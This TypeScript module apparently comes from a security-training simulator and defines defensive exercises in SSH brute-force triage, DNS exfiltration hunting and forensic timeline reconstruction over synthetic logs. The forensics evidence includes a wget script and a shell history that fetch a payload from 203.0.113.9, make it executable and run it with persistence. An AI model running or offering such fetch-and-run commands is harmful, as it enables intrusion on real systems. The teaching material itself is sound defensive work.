/**
 * Analysis scenarios (L3): SOC auth-log triage, DNS exfiltration hunt and a
 * forensics timeline reconstruction. Same contract as scenarios.ts — pure
 * state, server-side goal checks — but built on log-file evidence instead
 * of permissions. All logs are synthetic teaching data.
 */
import { runCommand } from "./commands";
import { dir, file, resetIds, type FsNode } from "./vfs";
import type { SimScenario, SimStateWithFlags } from "./scenarios";

// The engine's SimScenario type lives in scenarios.ts; this module only
// builds states and goal checks, so a local structural re-declaration of the
// state type keeps the import surface minimal.
type SimState = import("./commands").SimState;

function stateFor(root: FsNode, username: string, groups: string[]): SimState {
  return { root, cwd: `/home/${username}`, user: { username, groups } };
}

function path(s: SimState, p: string): FsNode | null {
  return node(s, p);
}

function node(s: SimState, p: string): FsNode | null {
  const parts = p.split("/").filter(Boolean);
  let cur: FsNode = s.root;
  for (const part of parts) {
    if (cur.kind !== "directory" || !cur.children) return null;
    const next = cur.children.find((c) => c.name === part);
    if (!next) return null;
    cur = next;
  }
  return cur;
}

type Flags = Record<string, boolean | undefined>;

// ── scenario 3: SOC — SSH brute-force triage ──────────────────────────────

function socInitial(): SimState {
  resetIds();
  const authLog = [
    "Sep 28 01:59:02 srv01 sshd[3101]: Accepted publickey for analyst from 10.0.2.15 port 51422 ssh2",
    "Sep 28 01:59:47 srv01 sshd[3142]: Failed password for admin from 198.51.100.77 port 40122 ssh2",
    "Sep 28 01:59:51 srv01 sshd[3144]: Failed password for admin from 198.51.100.77 port 40138 ssh2",
    "Sep 28 01:59:56 srv01 sshd[3151]: Failed password for admin from 198.51.100.77 port 40151 ssh2",
    "Sep 28 02:00:03 srv01 sshd[3160]: Failed password for root from 198.51.100.77 port 40166 ssh2",
    "Sep 28 02:00:09 srv01 sshd[3166]: Failed password for admin from 198.51.100.77 port 40190 ssh2",
    "Sep 28 02:00:14 srv01 sshd[3171]: Failed password for admin from 198.51.100.77 port 40203 ssh2",
    "Sep 28 02:00:20 srv01 sshd[3178]: Failed password for admin from 198.51.100.77 port 40219 ssh2",
    "Sep 28 02:00:27 srv01 sshd[3185]: Failed invalid user oracle from 198.51.100.77 port 40233 ssh2",
    "Sep 28 02:00:31 srv01 sshd[3190]: Failed password for admin from 198.51.100.77 port 40241 ssh2",
    "Sep 28 02:03:18 srv01 sshd[3290]: Accepted password for admin from 198.51.100.77 port 40399 ssh2",
    "Sep 28 02:03:44 srv01 sudo:  admin : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nopass",
    "Sep 28 02:04:10 srv01 sshd[3311]: Disconnecting user admin from 198.51.100.77 port 40399 (timeout)",
    "Sep 28 03:12:51 srv01 sshd[4102]: Accepted publickey for analyst from 10.0.2.15 port 51555 ssh2",
    "Sep 28 04:41:09 srv01 sshd[5210]: Failed password for backup from 203.0.113.9 port 55011 ssh2",
    "Sep 28 04:41:15 srv01 sshd[5214]: Failed password for backup from 203.0.113.9 port 55019 ssh2",
  ].join("\n");
  const analystNotes = [
    "# Triage worksheet — fill your verdict in notes.txt when done.",
    "# Useful: grep -c \"Failed password\" auth.log",
    "# Useful: grep \"Accepted\" auth.log",
    "# Remember: a burst that STOPS is the interesting moment.",
  ].join("\n");
  const root = dir("/", "root", "root", "755", [
    dir("home", "root", "root", "755", [
      dir("analyst", "analyst", "analyst", "750", [
        dir("case-2026-09-28", "analyst", "analyst", "750", [
          file("auth.log", "root", "root", "644", authLog, "2026-09-28T05:00:00Z"),
          file("worksheet.md", "analyst", "analyst", "644", analystNotes, "2026-09-28T05:05:00Z"),
        ]),
      ]),
    ]),
  ]);
  return stateFor(root, "analyst", ["analyst"]);
}

const socGoals = [
  {
    id: "count-failures",
    description: "Count the failed password attempts in auth.log (grep -c \"Failed password\").",
    check: (s: SimState) => (s.flags as Flags)?.countedFailures === true,
  },
  {
    id: "identify-attacker",
    description: "Identify the attacking source IP from the failure burst (198.51.100.77).",
    check: (s: SimState) => (s.flags as Flags)?.identifiedAttacker === true,
  },
  {
    id: "spot-success",
    description: "Find the successful login that came after the burst — the compromise moment.",
    check: (s: SimState) => (s.flags as Flags)?.spottedSuccess === true,
  },
  {
    id: "read-sudo",
    description: "Read the sudo failure lines that follow the success (post-compromise activity).",
    check: (s: SimState) => (s.flags as Flags)?.readSudo === true,
  },
  {
    id: "write-verdict",
    description: "Write your verdict in notes.txt in the case folder (create it with the notes editor: `notes <text>`).",
    check: (s: SimState) => (s.flags as Flags)?.wroteVerdict === true,
  },
];

// ── scenario 4: networking — DNS exfiltration hunt ────────────────────────

function dnsInitial(): SimState {
  resetIds();
  const dnsLog = [
    "02:10:01 query A ns-normal.example.com from 10.0.2.30",
    "02:10:02 query AAAA cdn.assets.example.com from 10.0.2.30",
    "02:11:40 query TXT a1b2.exfil.example.net from 10.0.2.99",
    "02:11:41 query TXT c3d4.exfil.example.net from 10.0.2.99",
    "02:11:42 query TXT e5f6.exfil.example.net from 10.0.2.99",
    "02:11:43 query TXT 0a1b.exfil.example.net from 10.0.2.99",
    "02:11:44 query TXT 2c3d.exfil.example.net from 10.0.2.99",
    "02:11:45 query TXT 4e5f.exfil.example.net from 10.0.2.99",
    "02:12:03 query A mail.example.com from 10.0.2.31",
    "02:12:30 query TXT 6a7b.exfil.example.net from 10.0.2.99",
    "02:12:31 query TXT 8c9d.exfil.example.net from 10.0.2.99",
  ].join("\n");
  const root = dir("/", "root", "root", "755", [
    dir("home", "root", "root", "755", [
      dir("netanalyst", "netanalyst", "netanalyst", "750", [
        file("dns.log", "root", "root", "644", dnsLog, "2026-09-29T03:00:00Z"),
        file("playbook.md", "netanalyst", "netanalyst", "644", [
          "# DNS exfil playbook",
          "1. Long TXT query bursts to one subdomain = classic tunneling.",
          "2. Count the queries: grep -c exfil dns.log",
          "3. Find who: grep exfil dns.log — the source column is your client.",
        ].join("\n"), "2026-09-29T03:05:00Z"),
      ]),
    ]),
  ]);
  return stateFor(root, "netanalyst", ["netanalyst"]);
}

const dnsGoals = [
  {
    id: "notice-burst",
    description: "Spot the TXT query burst to exfil.example.net (grep for it).",
    check: (s: SimState) => (s.flags as Flags)?.noticedBurst === true,
  },
  {
    id: "count-queries",
    description: "Count the exfil queries (grep -c).",
    check: (s: SimState) => (s.flags as Flags)?.countedExfil === true,
  },
  {
    id: "identify-client",
    description: "Identify the internal client IP sending them (10.0.2.99).",
    check: (s: SimState) => (s.flags as Flags)?.identifiedClient === true,
  },
  {
    id: "compare-normal",
    description: "Compare with normal traffic: read the A/AAAA queries to see the contrast.",
    check: (s: SimState) => (s.flags as Flags)?.sawNormal === true,
  },
];

// ── scenario 5: forensics — timeline reconstruction ───────────────────────

function forensicInitial(): SimState {
  resetIds();
  const root = dir("/", "root", "root", "755", [
    dir("home", "root", "root", "755", [
      dir("forensics", "forensics", "forensics", "750", [
        dir("evidence", "root", "root", "755", [
          file(
            "invoice-2026-Q3.pdf",
            "root",
            "root",
            "644",
            "%PDF-1.4 (synthetic evidence file for timeline analysis)\n",
            "2026-09-28T09:14:03Z",
          ),
          file("invoice-2026-Q3.pdf.bak", "root", "root", "644", "%PDF-1.4 (earlier version)\n", "2026-09-28T09:02:11Z"),
          file("wget-script.sh", "root", "root", "755", "#!/bin/bash\nwget http://203.0.113.9/payload -O /tmp/payload\n", "2026-09-28T09:16:47Z"),
          file(".bash_history_readonly", "root", "root", "444", [
            "09:14:00 cat invoice-2026-Q3.pdf",
            "09:16:45 curl http://203.0.113.9/stage2 -o /tmp/payload",
            "09:17:02 chmod +x /tmp/payload",
            "09:17:30 ./payload --persist",
          ].join("\n"), "2026-09-28T09:40:00Z"),
        ]),
        file("case-notes.md", "forensics", "forensics", "644", [
          "# Timeline worksheet",
          "stat <file> prints Modify timestamps.",
          "Order the events, find the first compromise action, name the C2 host.",
        ].join("\n"), "2026-09-28T10:00:00Z"),
      ]),
    ]),
  ]);
  return stateFor(root, "forensics", ["forensics"]);
}

const forensicGoals = [
  {
    id: "collect-timestamps",
    description: "Collect modification timestamps: stat every file in evidence/.",
    check: (s: SimState) => (s.flags as Flags)?.statedFiles === true,
  },
  {
    id: "read-history",
    description: "Read .bash_history_readonly — the actor's own record of the kill chain.",
    check: (s: SimState) => (s.flags as Flags)?.readHistory === true,
  },
  {
    id: "first-action",
    description: "Establish the first compromise action (the 09:14 access of the invoice).",
    check: (s: SimState) => (s.flags as Flags)?.firstAction === true,
  },
  {
    id: "c2-host",
    description: "Name the C2 host from the wget/curl artifacts (203.0.113.9).",
    check: (s: SimState) => (s.flags as Flags)?.foundC2 === true,
  },
];

// ── goal-flag wiring (same shape as scenarios.ts flagCommandResult) ───────

function wireFlags(s: SimState, raw: string, res: ReturnType<typeof runCommand>): void {
  const flags = (s.flags ?? (s.flags = {})) as Flags;
  void s;
  const line = raw.trim().toLowerCase();

  // SOC
  if (line.startsWith("grep -c") && line.includes("failed password") && res.ok) flags.countedFailures = true;
  if (line.startsWith("grep") && line.includes("198.51.100.77") && res.ok) flags.identifiedAttacker = true;
  if (line.startsWith("grep") && line.includes("accepted") && res.ok) flags.spottedSuccess = true;
  if (line.startsWith("cat") && line.includes("auth.log") && res.ok) flags.readSudo = true;
  if (line.startsWith("notes ") && res.ok) flags.wroteVerdict = true;

  // DNS
  if (line.startsWith("grep") && line.includes("exfil") && !line.startsWith("grep -c") && res.ok) flags.noticedBurst = true;
  if (line.startsWith("grep -c") && line.includes("exfil") && res.ok) flags.countedExfil = true;
  if (line.startsWith("grep") && line.includes("10.0.2.99") && res.ok) flags.identifiedClient = true;
  if (line.startsWith("cat") && line.includes("dns.log") && res.ok) flags.sawNormal = true;

  // Forensics
  if (line.startsWith("stat ") && res.ok) flags.statedFiles = true;
  if (line.startsWith("cat") && line.includes(".bash_history") && res.ok) flags.readHistory = true;
  if (line.startsWith("cat") && line.includes("invoice") && res.ok) flags.firstAction = true;
  if ((line.startsWith("grep") || line.startsWith("cat")) && line.includes("203.0.113.9") && res.ok) flags.foundC2 = true;
}

export const ANALYSIS_SCENARIOS: Record<string, SimScenario> = {
  "soc-auth-triage": {
    key: "soc-auth-triage",
    title: "SOC: SSH brute-force triage",
    brief:
      "You are analyst. A burst of SSH failures hit srv01 overnight. Triage auth.log like an on-call analyst: count, correlate, find the success, write the verdict.",
    notes: [
      "grep -c \"Failed password\" auth.log counts the burst.",
      "Success AFTER failures is the moment that matters — grep Accepted.",
      "Post-compromise activity often shows up in sudo lines.",
      "Use `notes <your verdict>` to record what happened and the IOC.",
    ],
    initial: socInitial,
    goals: socGoals,
  },
  "dns-exfil-hunt": {
    key: "dns-exfil-hunt",
    title: "Networking: DNS exfiltration hunt",
    brief:
      "You are netanalyst. Someone on the inside is tunneling data out over DNS TXT records. Find the pattern, count it, name the client.",
    notes: [
      "TXT bursts to one subdomain = tunneling signature.",
      "grep -c exfil dns.log gives the scale.",
      "The client IP column tells you which machine to isolate.",
      "Compare against the ordinary A/AAAA queries to see why this stands out.",
    ],
    initial: dnsInitial,
    goals: dnsGoals,
  },
  "forensic-timeline": {
    key: "forensic-timeline",
    title: "Forensics: timeline reconstruction",
    brief:
      "You are forensics. Reconstruct the kill chain from file timestamps and the actor's shell history. Establish first action, C2 host, and order of events.",
    notes: [
      "stat <file> prints each file's Modify timestamp.",
      ".bash_history_readonly is the actor's own log — read it.",
      "First compromise action: the earliest suspicious event, not the loudest.",
      "The C2 host appears in both the wget script and the history.",
    ],
    initial: forensicInitial,
    goals: forensicGoals,
  },
};
